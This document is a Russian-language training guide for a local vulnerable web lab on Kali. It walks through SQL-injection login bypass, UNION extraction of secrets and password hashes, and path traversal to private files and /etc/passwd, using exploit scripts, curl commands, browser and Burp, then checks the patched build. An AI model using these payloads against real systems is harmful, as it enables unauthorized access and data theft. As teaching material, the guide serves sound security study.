# GameHub Lab на Kali Linux — пошаговый разбор

Практическое руководство: как поднять обе версии стенда на виртуальной машине
Kali Linux, как устроены эксплойты и как эксплуатировать обе уязвимости вручную
(браузером, `curl` и через перехват запроса в Burp).

Стенд учебный и слушает только `127.0.0.1`. Не выносите его в сеть.

---

## 0. Что понадобится

| Компонент | Версия | Проверка |
|---|---|---|
| Kali Linux | 2024.x+ | `cat /etc/os-release` |
| Python | 3.11+ | `python3 --version` |
| pip + venv | штатные | `python3 -m venv --help` |
| `git` | любой | `git --version` |
| `curl` | любой | `curl --version` |
| Burp Suite CE | опционально | `burpsuite` |

Перевод строк: файлы в проекте с LF, на Linux это родной формат — ничего
конвертировать не нужно.

---

## 1. Копирование проекта на ВМ

### 1.1. Через общую папку VirtualBox/VMware

Если архив `gamehub-lab.zip` лежит на хосте и проброшен в ВМ:

```bash
mkdir -p ~/labs && cd ~/labs
cp /media/sf_shared/gamehub-lab.zip .
unzip -q gamehub-lab.zip
cd gamehub-lab
ls -R | head -40
```

Ожидаемая структура:

```
gamehub-lab/
├── vulnerable/gamehub/     ← уязвимая сборка
├── fixed/gamehub/          ← исправленная сборка
├── security-fixes.diff     ← патч между ними
├── README.md               ← отчёт по лаборатории
└── GUIDE-KALI.md           ← этот файл
```

### 1.2. Через `scp` с хоста

На хосте (не в ВМ):

```bash
scp gamehub-lab.zip kali@192.168.56.101:~/
```

В ВМ:

```bash
cd ~ && unzip -q gamehub-lab.zip && cd gamehub-lab
```

### 1.3. Права

Распакованные файлы принадлежат тому, кто распаковал. Ничего дополнительно
выдавать не нужно — но убедитесь, что каталог ваш:

```bash
ls -ld ~/labs/gamehub-lab
# drwxr-xr-x 5 kali kali ... — владелец kali, всё в порядке
```

Если владелец не вы (распаковывали из-под `sudo`):

```bash
sudo chown -R $USER:$USER ~/labs/gamehub-lab
```

---

## 2. Запуск уязвимой версии

### 2.1. Виртуальное окружение

Ставьте зависимости в `venv`, а не в системный Python — в Kali он управляется
пакетным менеджером, и `pip install` туда может быть заблокирован
(`externally-managed-environment`).

```bash
cd ~/labs/gamehub-lab/vulnerable/gamehub
python3 -m venv .venv
source .venv/bin/activate
pip install --upgrade pip
pip install -r requirements.txt
```

Проверка, что окружение активно (в приглашении появится `(.venv)`):

```bash
which python3
# /home/kali/labs/gamehub-lab/vulnerable/gamehub/.venv/bin/python3
```

### 2.2. Инициализация базы

```bash
python init_db.py
```

Ожидаемый вывод:

```
Database created.
Admin demo account: admin / LabAdmin-ChangeMe-2026
Player demo account: player / PlayerDemo-ChangeMe-2026
Use these credentials only in this local lab.
```

Появятся `gamehub.sqlite3`, `lab_data/public/guide.txt` и
`lab_data/private/secret.txt`. Проверим:

```bash
ls -l lab_data/public lab_data/private
cat lab_data/private/secret.txt
# gamehub-internal
# GAMEHUB{p4th_tr4v3rs4l_r34ch3d_pr1v4t3_f1l3}
# Этот файл не должен скачиваться через /download.
```

Отдельно запускать `init_db.py` не обязательно: `python app.py` сам создаст
базу, если файла `gamehub.sqlite3` нет (см. блок `if __name__ == "__main__"`
в конце `app.py`). Но явный вызов полезнее — вы увидите учётные данные и
сможете убедиться, что база создалась до старта сервера.

Посмотреть, что в базе (пригодится для ручной эксплуатации):

```bash
sqlite3 gamehub.sqlite3 ".tables"
sqlite3 gamehub.sqlite3 "SELECT id, username, is_admin FROM users;"
sqlite3 gamehub.sqlite3 "SELECT * FROM lab_secrets;"
```

### 2.3. Запуск

```bash
python app.py
```

```
 * Serving Flask app 'app'
 * Running on http://127.0.0.1:5000
```

Важно: `app.py` жёстко слушает `127.0.0.1:5000` (последняя строка файла —
`app.run(host="127.0.0.1", port=5000, debug=False)`). Если порт занят, есть два
способа сменить его, не редактируя код. Первый — импортировать приложение и
запустить вручную:

```bash
python -c "import app; app.app.run(host='127.0.0.1', port=5001, debug=False)"
```

Второй — штатный запуск Flask, он тоже переопределяет порт:

```bash
python -m flask --app app run --port 5001
```

Оба проверены: сервер поднимается и отвечает `200`. `flask run` удобнее тем,
что печатает список маршрутов по `--help` и умеет `--debug`, но в учебном
стенде `debug=False` предпочтительнее: с отладчиком любая ошибка SQL открывает
интерактивную консоль Werkzeug, а это уже отдельная уязвимость (RCE).

Второй терминал (окружение нужно активировать заново):

```bash
cd ~/labs/gamehub-lab/vulnerable/gamehub
source .venv/bin/activate
curl -i http://127.0.0.1:5000/
```

Готово — стенд работает.

### 2.4. Остановка

`Ctrl+C` в терминале с сервером. Если сервер «завис» в фоне:

```bash
ss -tlnp | grep 5000
kill <PID>
```

---

## 3. Запуск исправленной версии

Отдельная копия со своим окружением и своей базой:

```bash
cd ~/labs/gamehub-lab/fixed/gamehub
python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
python init_db.py
python app.py
```

**Почему своя база обязательна.** В уязвимой версии `hash_password()` —
это `sha256` без соли, в исправленной — `generate_password_hash()` (scrypt).
Формат хешей разный, поэтому база одной версии не подходит другой: пароли
просто не совпадут, и вы решите, что «сломался вход». У каждой сборки должен
быть свой `gamehub.sqlite3`.

Чтобы держать оба стенда одновременно, запустите второй на другом порту:

```bash
python -c "import app; app.app.run(host='127.0.0.1', port=5001, debug=False)"
```

Или скопируйте сборки в отдельные каталоги (`~/labs/vuln`, `~/labs/fixed`) —
так удобнее, если планируете часто переключаться.

---

## 4. Разбор эксплойта SQL-инъекции

Файл: `exploits/exploit_sqli.py`.

### 4.1. Мини-клиент на `urllib`

```python
class Session:
    def __init__(self, base_url: str) -> None:
        self.base_url = base_url.rstrip("/")
        self.opener = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(http.cookiejar.CookieJar())
        )
```

Почему не `requests`: эксплойт должен работать на голом Python, без установки
зависимостей — на чужой машине `pip install requests` может быть недоступен.
`HTTPCookieProcessor` с `CookieJar` — это то, что делает клиент «сессионным»:
Flask кладёт в cookie сессию после входа, и `admin`-страница открывается
только если cookie вернулась обратно.

```python
    def request(self, method, path, data=None):
        body = urllib.parse.urlencode(data).encode() if data is not None else None
        request = urllib.request.Request(self.base_url + path, data=body, method=method)
        try:
            with self.opener.open(request, timeout=10) as response:
                return response.status, response.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as error:
            return error.code, error.read().decode("utf-8", "replace")
```

`HTTPError` перехватывается намеренно: для кода 403/404 тело ответа тоже
нужно, а `urlopen` на них бросает исключение. `errors="replace"` — потому что
сервер отвечает HTML в UTF-8, но на всякий случай не хотим падать на битом
байте.

### 4.2. Атака 1a — вход без пароля

```python
status, body = session.post(
    "/login",
    {"username": "' OR 1=1 -- ", "password": "not-a-real-password"},
)
```

Что уходит на сервер (form-urlencoded):

```
username=%27+OR+1%3D1+--+&password=not-a-real-password
```

Что собирается в уязвимом `app.py`:

```python
query = (
    f"SELECT id, username, is_admin FROM users "
    f"WHERE username = '{username}' AND password_hash = '{password_hash}'"
)
```

Подстановка:

```sql
SELECT id, username, is_admin FROM users
WHERE username = '' OR 1=1 -- ' AND password_hash = '...'
```

Разбор по частям:

| Фрагмент | Роль |
|---|---|
| `'` в начале | закрывает строковый литерал `''`, открытый шаблоном |
| ` OR 1=1` | добавляет условие, истинное для каждой строки |
| `--` | начало комментария; съедает остаток, включая проверку пароля |

Про пробел после `--`. В **SQLite** пробел не нужен: `--` и `--x` одинаково
начинают комментарий до конца строки (проверено на 3.50.4). А вот в **MySQL**
`--` без пробела — это оператор вычитания, и payload вида `' OR 1=1 --` там
не сработает; нужен именно `-- `. Поскольку `app.py` делает
`username.strip()`, хвостовой пробел в любом случае срежется ещё до подстановки
в SQL — так что в JSON/форме он сохраняется для читаемости, но до запроса не
доезжает. Привычка писать `-- ` вырабатывается правильная и на SQLite не
вредит.

`fetchone()` вернёт первую строку (`admin`, id=1), потому что `users`
заполняется в порядке `admin`, `player`.

Скрипт проверяет признак успеха по тексту flash-сообщения:

```python
SUCCESS_MARKER = "Вход выполнен"
if SUCCESS_MARKER in body:
    report("УЯЗВИМО", "вход выполнен без корректного пароля")
```

Это надёжнее, чем смотреть на HTTP-код: успешный вход — это `302` на `/`,
неудачный — `200` с формой. Но `follow_redirects` в `urllib` по умолчанию
включён, поэтому оба случая приходят как `200`, и различить их можно только
по содержимому.

### 4.3. Атака 1b — вход конкретным администратором

```python
status, body = session.post(
    "/login",
    {"username": "admin' -- ", "password": "not-a-real-password"},
)
```

SQL после подстановки:

```sql
SELECT id, username, is_admin FROM users
WHERE username = 'admin' -- ' AND password_hash = '...'
```

Здесь нет `OR 1=1`: селект возвращает ровно строку `admin`, а `-- ` убирает
проверку пароля. Дальше скрипт проверяет, что сессия действительно даёт права:

```python
admin_status, admin_body = session.get("/admin")
if admin_status == 200 and ADMIN_MARKER in admin_body:
    report("УЯЗВИМО", "получен доступ к закрытой странице /admin")
```

`ADMIN_MARKER = "Доступ администратора подтверждён"` — это текст из
`templates/admin.html`. Проверка важна: вход мог «удаться» и без прав
администратора, если бы `fetchone()` вернул `player`.

### 4.4. Атака 2 — UNION-извлечение из чужой таблицы

```python
payload = "%' UNION SELECT 1, name, value, 2024, 8.0, 'injected' FROM lab_secrets -- "
```

Исходный запрос в `/games`:

```sql
SELECT id, title, genre, release_year, rating, description FROM games
WHERE title LIKE '%{query}%' OR genre LIKE '%{query}%'
```

Подстановка даёт (для наглядности — с переносами):

```sql
SELECT id, title, genre, release_year, rating, description FROM games
WHERE title LIKE '%%' UNION SELECT 1, name, value, 2024, 8.0, 'injected' FROM lab_secrets -- %'
   OR genre LIKE '%%' UNION SELECT ... -- %'
```

Ключевые условия успеха UNION:

1. **Совпадение числа колонок.** У `games` их шесть, значит и в `SELECT`
   после `UNION` должно быть шесть значений.
2. **Совместимость типов по позициям.** `id` — integer, `title` — text,
   `genre` — text, `release_year` — integer, `rating` — real,
   `description` — text. Поэтому `1, name, value, 2024, 8.0, 'injected'`:
   `name` и `value` из `lab_secrets` встают на места `title` и `genre`.
3. **Комментарий в конце.** `-- ` отрезает хвост `%' OR genre LIKE ...`.

`%` в начале нужен, чтобы первый `LIKE` стал `'%%'` — совпал со всеми
строками и результат не оказался пустым.

Строка из `lab_secrets` попадает в `title` карточки каталога, и `games.html`
выводит её как название игры. Скрипт ловит флаг регуляркой:

```python
match = re.search(r"GAMEHUB\{[^}]+\}", body)
```

`re.search`, а не `findall`: достаточно первого совпадения, а `{` и `}` в
регулярке экранировать не нужно, если они не образуют квантификатор вида
`{2,3}`.

### 4.5. Итог и код возврата

```python
vulnerable = sum(1 for finding in findings if finding)
return 1 if vulnerable else 0
```

`0` — «всё защищено», `1` — «есть успешные атаки», `2` — «сервер недоступен».
Так скрипт можно использовать в CI: ненулевой код на уязвимой сборке — это
ожидаемый результат проверки, а не сбой.

---

## 5. Разбор эксплойта Path Traversal

Файл: `exploits/exploit_path_traversal.py`.

### 5.1. Формирование URL

```python
def fetch(base_url, payload, pre_encoded):
    encoded = payload if pre_encoded else urllib.parse.quote(payload, safe="")
    url = f"{base_url.rstrip('/')}/download/{encoded}"
```

`safe=""` — важная деталь: по умолчанию `quote` не трогает `/`, и тогда
`../private/secret.txt` уехал бы как есть. С `safe=""` кодируется всё, включая
слэши: `..%2Fprivate%2Fsecret.txt`. Это нужно, чтобы сервер получил путь
одним сегментом и не нормализовал его на стороне клиента.

Флаг `pre_encoded` — для payload'ов, которые уже закодированы (двойное
кодирование): их нельзя кодировать второй раз, иначе смысл теряется.

### 5.2. Набор payload'ов зависит от платформы

```python
CORE_PAYLOADS = [
    ("относительный обход", "../private/secret.txt", False),
    ("обход к исходнику", "../../app.py", False),
    ("двойное кодирование", "%252e%252e%252fprivate%252fsecret.txt", True),
]
PAYLOADS = CORE_PAYLOADS + (WINDOWS_PAYLOADS if os.name == "nt" else POSIX_PAYLOADS)
```

Почему так:

| Платформа | Что работает | Что не работает |
|---|---|---|
| Windows | `../`, `..\`, `C:/Windows/win.ini` | `/etc/passwd` (такого файла нет) |
| Linux | `../`, `/etc/passwd` через `..` | `..\private\secret.txt` (обратный слэш — обычный символ), `C:/...` (не абсолютный путь) |

Глубина `../` до `/etc/passwd` зависит от того, куда распакован проект:
`lab_data/public` → `lab_data` → `gamehub` → … → `/` — это 5, 6, 8 уровней,
смотря где лежит каталог. Поэтому в наборе не одно значение, а перебор 3..12.

Ключевое свойство: **лишние `../` не мешают**. И на POSIX, и на Windows `..`
выше корня остаётся в корне, поэтому `../../../../../../../etc/passwd` и
`/etc/passwd` — один и тот же файл. Срабатывают все варианты с глубиной не
меньше реальной, а самый короткий из сработавших показывает её.

### 5.3. Уязвимый код

```python
path = os.path.join(str(PUBLIC_DIR), filename)
if not os.path.isfile(path):
    abort(404)
return send_file(os.path.abspath(path), ...)
```

`os.path.join("/home/kali/.../public", "../private/secret.txt")` даёт
`/home/kali/.../public/../private/secret.txt`. Сам по себе `..` не раскрывается —
это делает файловая система при `isfile()`. То есть проверка `isfile` не
защищает: она честно отвечает «файл существует», потому что `..` ведёт наружу.

Второй вектор — **абсолютный** путь. Если второй аргумент `os.path.join`
начинается со `/` (на POSIX) или с `C:\` (на Windows), база отбрасывается
целиком:

```python
os.path.join("/home/kali/.../public", "/etc/passwd")   # -> "/etc/passwd"
```

Это уже не обход, а прямая подмена аргумента.

### 5.4. Определение успеха

```python
hit = status == 200 and any(marker in text for marker in LEAK_MARKERS)
```

Одного `200` мало: сервер может отдать страницу-заглушку. Поэтому проверяются
маркеры содержимого — флаг из `secret.txt`, строка `SQL Injection` из
`app.py`, `root:x:0:0:` из `/etc/passwd`, `[fonts]` из `win.ini`.

### 5.5. Почему не срабатывает двойное кодирование

`%252e%252e%252f` после первого декодирования Flask превращается в
`%2e%2e%2f` — это **литеральное имя файла** `%2e%2e%2f...`, а не `../`.
`os.path.join` его не раскрывает. Чтобы такой payload сработал, приложение
должно декодировать дважды — здесь этого нет.

---

## 6. Ручная эксплуатация SQL-инъекции

Дальше — без скриптов, чтобы увидеть механику.

### 6.1. Подготовка

```bash
cd ~/labs/gamehub-lab/vulnerable/gamehub
source .venv/bin/activate
python app.py       # терминал 1
```

Терминал 2. Везде ниже `BASE=http://127.0.0.1:5000`.

```bash
BASE=http://127.0.0.1:5000
curl -s -c /tmp/c.txt $BASE/ -o /dev/null && echo "стенд отвечает"
```

### 6.2. Обход входа

Сначала — как выглядит нормальный неудачный вход:

```bash
curl -s -i -X POST $BASE/login \
  -d "username=admin&password=wrong" | head -40
```

Ответ `200`. Заголовков восемь строк, поэтому `head -40` (а не `-12`) —
иначе до текста ошибки не дойдёте: он в районе 35-й строки. Быстрее сразу
вытащить нужное:

```bash
curl -s -X POST $BASE/login -d "username=admin&password=wrong" \
  | grep -o "Неверное имя пользователя или пароль."
```

Теперь инъекция:

```bash
curl -s -i -c /tmp/c.txt -X POST $BASE/login \
  --data-urlencode "username=' OR 1=1 -- " \
  --data-urlencode "password=whatever" | head -8
```

Что смотреть:

* `HTTP/1.1 302 FOUND` — вход выполнен;
* `Location: /` и `Set-Cookie: session=...` в тех же первых восьми строках.

`--data-urlencode` здесь принципиален: он закодирует пробелы, `'` и `+` так,
как нужно. Если писать `-d "username=' OR 1=1 -- &..."` вручную, `&`
разорвёт данные, а `+` станет пробелом не там, где надо.

Важная ловушка: **не добавляйте `-L` к запросу с `-X POST`**. С `-L` curl
пойдёт по редиректу на `/` и повторит там **POST** (потому что `-X` жёстко
фиксирует метод), а `/` принимает только GET → получите `405` и решите, что
инъекция не сработала. Правильно — либо без `-L`, либо без `-X POST` (тогда
curl сам выберет POST из наличия `-d`/`--data-urlencode` и на редиректе
переключится на GET):

```bash
curl -s -L -c /tmp/c.txt $BASE/login \
  --data-urlencode "username=' OR 1=1 -- " \
  --data-urlencode "password=whatever" | grep -o "Вход выполнен: admin"
```

Этот вариант печатает `Вход выполнен: admin` — flash-сообщение с главной
страницы после редиректа.

Проверяем, что сессия даёт права:

```bash
curl -s -b /tmp/c.txt $BASE/admin | grep -o "Доступ администратора подтверждён"
curl -s -b /tmp/c.txt $BASE/admin | grep -o "Текущий пользователь: <strong>[a-z]*"
```

Второй payload — вход именно администратором:

```bash
curl -s -i -c /tmp/c2.txt -X POST $BASE/login \
  --data-urlencode "username=admin' -- " \
  --data-urlencode "password=whatever" | head -6
curl -s -b /tmp/c2.txt $BASE/admin | grep -o "Доступ администратора подтверждён"
```

#### Почему это работает — по шагам

1. Приложение берёт `username` из формы и **вставляет в текст SQL** через
   f-string.
2. Драйвер получает уже готовую строку и не знает, где кончаются данные.
3. Кавычка в payload закрывает литерал, `-- ` комментирует остаток.
4. Условие `password_hash = '...'` исчезает из запроса — пароль не проверяется.

#### Через браузер

То же самое в DevTools: открыть `http://127.0.0.1:5000/login`, F12 →
Network, ввести в поле логина `' OR 1=1 -- ` и любой пароль, нажать «Войти»,
посмотреть отправленные form data. Ответ — редирект на главную с сообщением
об успешном входе.

### 6.3. UNION-извлечение

Сначала убедимся, что каталог ищет нормально:

```bash
curl -s "$BASE/games?q=Neon" | grep -o "Neon Drift" | head -1
```

И сразу — самая быстрая проверка, что инъекция вообще возможна. Одиночная
кавычка в обычном поиске ломает SQL и даёт `500`, а двойная — уже нет:

```bash
curl -s -o /dev/null -w "%{http_code}\n" "$BASE/games?q=Neon%27"     # 500
curl -s -o /dev/null -w "%{http_code}\n" "$BASE/games?q=Neon%27%27"   # 200
```

Это и есть точка инъекции: первый запрос получился `LIKE '%Neon'%'` —
незакрытый литерал. В исправленной версии обе строки дают `200` (и ноль
результатов), потому что кавычка остаётся данными, а не кодом.

Теперь определим число колонок. Классический способ — `ORDER BY`:

```bash
curl -s -G "$BASE/games" --data-urlencode "q=%' ORDER BY 1 -- " -o /dev/null -w "%{http_code}\n"
curl -s -G "$BASE/games" --data-urlencode "q=%' ORDER BY 6 -- " -o /dev/null -w "%{http_code}\n"
curl -s -G "$BASE/games" --data-urlencode "q=%' ORDER BY 7 -- " -o /dev/null -w "%{http_code}\n"
```

Первые два — `200`, третий — `500` (в SQLite «1st ORDER BY term out of
range»). Значит, колонок шесть. На уязвимой версии `debug=False`, поэтому
вместо трейсбека придёт страница ошибки — код `500` всё равно виден.

Дальше — сам UNION:

```bash
curl -s -G "$BASE/games" \
  --data-urlencode "q=%' UNION SELECT 1, name, value, 2024, 8.0, 'injected' FROM lab_secrets -- " \
  | grep -o "GAMEHUB{[^}]*}"
```

Ожидаемо: `GAMEHUB{un10n_b4s3d_5ql1_w0rk5}`.

Если вместо этого пусто — проверьте по очереди:

```bash
# 1) сколько строк вернул запрос (должна появиться хотя бы одна карточка)
curl -s -G "$BASE/games" --data-urlencode "q=%' UNION SELECT 1, name, value, 2024, 8.0, 'x' FROM lab_secrets -- " | grep -c "game-card"

# 2) что вообще в lab_secrets
sqlite3 gamehub.sqlite3 "SELECT name, value FROM lab_secrets;"

# 3) не лишний ли пробел в начале `q` (strip() его срежет, но вместе с ним
#    может уехать и часть payload'а — держите `%` первым символом)
```

#### Чтение других таблиц

Тот же приём работает для любой таблицы с подходящими типами. Например,
вытащить хеши паролей:

```bash
curl -s -G "$BASE/games" \
  --data-urlencode "q=%' UNION SELECT 1, username, password_hash, 2024, 8.0, 'dump' FROM users -- " \
  | grep -oE "[a-f0-9]{64}"
```

Шестьдесят четыре hex-символа — это `sha256` без соли. Такой хеш ломается
по радужным таблицам мгновенно, что и демонстрирует вред слабого хранения
паролей (в исправленной версии здесь был бы scrypt, и grep ничего бы не нашёл).

#### Через браузер

В адресной строке:

```
http://127.0.0.1:5000/games?q=%25%27%20UNION%20SELECT%201%2C%20name%2C%20value%2C%202024%2C%208.0%2C%20%27x%27%20FROM%20lab_secrets%20--%20
```

Проще — ввести в поле поиска каталога сырой payload:

```
%' UNION SELECT 1, name, value, 2024, 8.0, 'x' FROM lab_secrets -- 
```

и нажать «Найти». Браузер закодирует сам. В карточках появится строка с флагом.

---

## 7. Ручная эксплуатация Path Traversal

### 7.1. Легальное скачивание

```bash
curl -s -i "$BASE/download/guide.txt" | head -8
```

`200`, `Content-Disposition: attachment; filename=guide.txt`, тело — текст
про учебный файл.

### 7.2. Обход каталога

```bash
curl -s "$BASE/download/../private/secret.txt"
```

Но тут есть тонкость: `curl` нормализует `..` **на своей стороне** и отправит
уже `/download/private/secret.txt`. Чтобы этого избежать, есть `--path-as-is`:

```bash
curl -s --path-as-is "$BASE/download/../private/secret.txt"
```

Ожидаемо:

```
gamehub-internal
GAMEHUB{path_traversal_reached_private_file}
Этот файл не должен скачиваться через /download.
```

Закодированный вариант. Тут важно закодировать **и точки, и слэши** — тогда
curl не увидит в URL компонента `..` и отправит путь как есть:

```bash
curl -s "$BASE/download/%2e%2e%2fprivate%2fsecret.txt"
curl -s "$BASE/download/..%2fprivate%2fsecret.txt"
curl -s "$BASE/download/%2E%2E%2Fprivate%2Fsecret.txt"
```

Все три печатают тот же файл.

А вот вариант `%2E%2E/private/secret.txt` (точки закодированы, а слэш —
обычный) **без `--path-as-is` не сработает**: curl декодирует `%2E` в `.`,
получает компонент `..` и нормализует его, отправляя
`/download/private/secret.txt`. Проверено: тот же URL с `--path-as-is`
читает файл, без него — `404`. Это и есть причина, по которой в payload'ах
эксплойта слэш тоже закодирован (`urllib.parse.quote(..., safe="")`).

### 7.3. Чтение исходного кода

```bash
curl -s "$BASE/download/..%2f..%2fapp.py" | head -20
```

Увидите docstring с предупреждением «Этот файл намеренно содержит уязвимости» —
хорошая иллюстрация того, что утечка исходников облегчает поиск других дыр.

### 7.4. Выход в систему

На Linux, где стенд лежит в `~/labs/gamehub-lab/vulnerable/gamehub`:

```bash
curl -s "$BASE/download/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd" | head -3
```

Глубина зависит от того, куда вы распаковали проект, поэтому не угадывайте —
посчитайте:

```bash
cd ~/labs/gamehub-lab/vulnerable/gamehub
python3 - <<'PY'
from pathlib import Path
depth = len(Path("lab_data/public").resolve().parts) - 1   # без корня "/"
print("нужно уровней ../:", depth)
print("../" * depth + "etc/passwd")
PY
```

Вывод подставьте в `curl`. Для `~/labs/gamehub-lab/vulnerable/gamehub` это
`../../../../../../../../etc/passwd` — восемь уровней: `public` → `lab_data` →
`gamehub` → `vulnerable` → `gamehub-lab` → `labs` → `kali` → `home` → `/`.
Скрипт выше считает ровно это число, поэтому не переписывайте его вручную:
`len(parts) - 1` даёт 8, и любые «на глаз» посчитанные 5–6 уровней дадут 404.

Хорошая новость: **лишние `../` не ломают запрос** — и на POSIX, и на Windows
`..` выше корня остаётся в корне (`/../../etc/passwd` → `/etc/passwd`,
`C:\..\..\Windows\win.ini` → `C:\Windows\win.ini`). Значит, если сомневаетесь,
добавьте `../` с запасом. Именно поэтому эксплойт перебирает глубину от 3 до 12:
сработают все варианты, где уровней не меньше реальной глубины, а самый
короткий из сработавших покажет её.

Отсюда же объяснение, почему в наборе для Windows `../../../Windows/win.ini`
даёт `отказ`: дело не в том, что «на Windows так нельзя», а в том, что от
`...\gamehub` до `C:\Windows` нужна другая глубина. С правильным числом
уровней этот файл тоже читается.

### 7.5. Почему `..\` на Linux не работает

```bash
curl -s "$BASE/download/..%5cprivate%5csecret.txt"
```

`404`. На POSIX обратный слэш — обычный символ в имени файла, поэтому
`os.path.join` даёт строку `/…/public/..\private\secret.txt`, и такой файл
не существует. Это чисто Windows-вектор.

### 7.6. Через браузер

Сырые `..` браузер нормализует сам, поэтому в адресную строку нужно вводить
**закодированный** вариант:

```
http://127.0.0.1:5000/download/%2e%2e%2fprivate%2fsecret.txt
```

Файл скачается как `secret.txt`. Firefox/Chromium дополнительно могут
«поправить» URL — если не срабатывает, смотрите в DevTools → Network, что
реально ушло в запросе.

### 7.7. Через Burp (если нужен полный контроль)

1. Запустить Burp, включить прокси `127.0.0.1:8080`.
2. В браузере — прокси на Burp, открыть `http://127.0.0.1:5000/download/guide.txt`.
3. В Burp: `Proxy` → `HTTP history` → правый клик по запросу →
   `Send to Repeater`.
4. В Repeater заменить строку:

   ```
   GET /download/guide.txt HTTP/1.1
   ```

   на

   ```
   GET /download/..%2fprivate%2fsecret.txt HTTP/1.1
   ```

5. `Send`. В ответе — содержимое `secret.txt`.

Repeater удобен тем, что не нормализует URL: вы отправляете ровно те байты,
которые написали.

---

## 8. Проверка, что защиты работают

Повторите те же запросы против **исправленной** версии (порт 5001).

### 8.1. SQLi

```bash
curl -s -i -X POST http://127.0.0.1:5001/login \
  --data-urlencode "username=' OR 1=1 -- " \
  --data-urlencode "password=whatever" | head -4
# HTTP/1.1 200 OK  (а не 302) и «Неверное имя пользователя или пароль.»

curl -s -G "http://127.0.0.1:5001/games" \
  --data-urlencode "q=%' UNION SELECT 1, name, value, 2024, 8.0, 'x' FROM lab_secrets -- " \
  | grep -c "GAMEHUB{"     # 0

curl -s -o /dev/null -w "%{http_code}\n" "http://127.0.0.1:5001/games?q=Neon%27"   # 200 здесь!
```

Третья строка — самая убедительная: в уязвимой версии одиночная кавычка давала
`500`, в исправленной она безопасна и даёт `200` с пустой выдачей.

### 8.2. Traversal

```bash
for p in "%2e%2e%2fprivate%2fsecret.txt" \
         "..%2f..%2fapp.py" \
         "..%5cprivate%5csecret.txt" \
         "%252e%252e%252fprivate%252fsecret.txt"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://127.0.0.1:5001/download/$p")
  echo "$p -> $code"
done
# все строки должны быть 404
```

Если хоть один вернул `200` — это находка, её надо разбирать отдельно.

### 8.3. Автотесты

```bash
cd ~/labs/gamehub-lab/vulnerable/gamehub && python -m pytest -q
# 5 failed, 10 passed   ← падают ровно security-тесты

cd ~/labs/gamehub-lab/fixed/gamehub && python -m pytest -q
# 15 passed
```

---

## 9. Частые проблемы на Kali

| Симптом | Причина | Решение |
|---|---|---|
| `error: externally-managed-environment` | pip не даёт ставить в системный Python | работать в `venv` (раздел 2.1) |
| `Address already in use` | порт 5000 занят | `ss -tlnp \| grep 5000`, затем `kill <PID>` или другой порт |
| После входа «неверный пароль», хотя пароль верный | база создана другой версией приложения (sha256 vs scrypt) | удалить `gamehub.sqlite3` и заново `python init_db.py` |
| Traversal даёт `404` на уязвимой версии | неверная глубина `../` | посчитать глубину скриптом из 7.4 |
| `curl` съедает `..` | клиент нормализует путь | `curl --path-as-is ...` |
| В браузере traversal не работает | браузер нормализует URL | использовать `%2e%2e%2f` или Burp Repeater |
| После `curl -L` получаете `405` | `-L` вместе с `-X POST` повторяет POST на `/` | убрать `-L` или убрать `-X POST` (см. 6.2) |
| `head -12` не показывает текст ошибки | до него ~35 строк из-за заголовков | `head -40` или сразу `grep -o "Неверное имя..."` |
| `grep` не находит кириллицу | локаль не UTF-8 (`LANG=C`) | `export LANG=ru_RU.UTF-8` или искать латиницу/флаг |
| `ModuleNotFoundError: flask` | не активирован `venv` | `source .venv/bin/activate` |
| `sqlite3: command not found` | нет CLI в системе | `sudo apt install sqlite3` (или смотреть базу через `python -c`) |

---

## 10. Чек-лист занятия

1. Поднять уязвимую версию, пройти нормальный вход `admin` / `LabAdmin-ChangeMe-2026`.
2. Обойти вход через `' OR 1=1 -- `, затем через `admin' -- `.
3. Открыть `/admin` с полученной сессией — убедиться, что права настоящие.
4. Определить число колонок через `ORDER BY`.
5. Извлечь `lab_secrets` через `UNION SELECT` — получить флаг.
6. Вытащить `password_hash` из `users` и обсудить, почему sha256 без соли — плохо.
7. Скачать `guide.txt` легально.
8. Прочитать `secret.txt` через `../`.
9. Прочитать `app.py` — найти в нём сам код уязвимости.
10. Прочитать `/etc/passwd` (на Linux — с верной глубиной `../`).
11. Повторить пункты 2, 5, 8 против исправленной версии — получить отказы.
12. Запустить `pytest` на обеих сборках и сравнить числа.
13. Прочитать `security-fixes.diff` и объяснить каждое изменение.
